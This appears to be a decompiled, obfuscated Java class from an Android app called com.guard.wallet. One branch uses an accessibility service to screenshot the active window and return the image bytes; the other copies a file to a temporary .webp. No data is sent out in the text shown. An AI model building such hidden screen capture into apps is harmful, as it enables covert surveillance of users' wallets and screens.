package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.os.Build;
import android.view.accessibility.AccessibilityWindowInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.Executor;
import p013p.AbstractC0857b;
import p017u.C0918a;

/* renamed from: com.guard.wallet.thread.k */
/* loaded from: classes.dex */
public final class CallableC0242k implements Callable {

    /* renamed from: a */
    public final /* synthetic */ int f389a = 0;

    /* renamed from: b */
    public final Object f390b;

    public CallableC0242k(Float f2) {
        if (Build.VERSION.SDK_INT >= 30) {
            this.f390b = new C0918a(f2);
        }
    }

    @Override // java.util.concurrent.Callable
    public final Object call() {
        C0918a c0918a;
        Executor mainExecutor;
        int i2 = this.f389a;
        Object obj = this.f390b;
        switch (i2) {
            case 0:
                if (Build.VERSION.SDK_INT < 30 || (c0918a = (C0918a) obj) == null || !c0918a.m1384b()) {
                    return null;
                }
                TakeScreenShotResult takeScreenShotResult = new TakeScreenShotResult();
                if (MyAccessibilityService.m554P() != null) {
                    int i3 = 0;
                    c0918a.f2080a.set(0);
                    c0918a.f2083d = null;
                    MyAccessibilityService m554P = MyAccessibilityService.m554P();
                    m554P.getClass();
                    try {
                        List<AccessibilityWindowInfo> windows = m554P.getWindows();
                        if (windows != null && !windows.isEmpty()) {
                            Iterator<AccessibilityWindowInfo> it = windows.iterator();
                            while (true) {
                                if (it.hasNext()) {
                                    AccessibilityWindowInfo next = it.next();
                                    if (next != null && next.isActive() && Build.VERSION.SDK_INT >= 30) {
                                        i3 = next.getDisplayId();
                                    }
                                }
                            }
                        }
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("MyAccessibilityService", e2);
                    }
                    if (i3 < 0) {
                        i3 = AbstractC0249e.f409b.intValue();
                    }
                    MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
                    mainExecutor = MainApplication.getAppContext().getMainExecutor();
                    m554P2.takeScreenshot(i3, mainExecutor, c0918a);
                    while (!c0918a.m1384b()) {
                        AbstractC0251g.T0(1);
                    }
                    takeScreenShotResult.setSaveBytesResult(c0918a.f2083d);
                    takeScreenShotResult.setSaveFileResult(null);
                    c0918a.f2080a.set(-1);
                    c0918a.f2083d = null;
                }
                return takeScreenShotResult;
            default:
                String i02 = AbstractC0251g.i0();
                if (AbstractC0026q.m151B(i02)) {
                    return null;
                }
                String concat = i02.concat("/").concat("tmp-".concat(String.valueOf(System.currentTimeMillis())).concat(".webp"));
                if (AbstractC0857b.m1241b((String) obj, concat)) {
                    return AbstractC0026q.m159J(concat);
                }
                return null;
        }
    }

    public CallableC0242k(String str) {
        this.f390b = str;
    }

    public CallableC0242k(boolean z2) {
        if (Build.VERSION.SDK_INT >= 30) {
            this.f390b = new C0918a(z2);
        }
    }
}
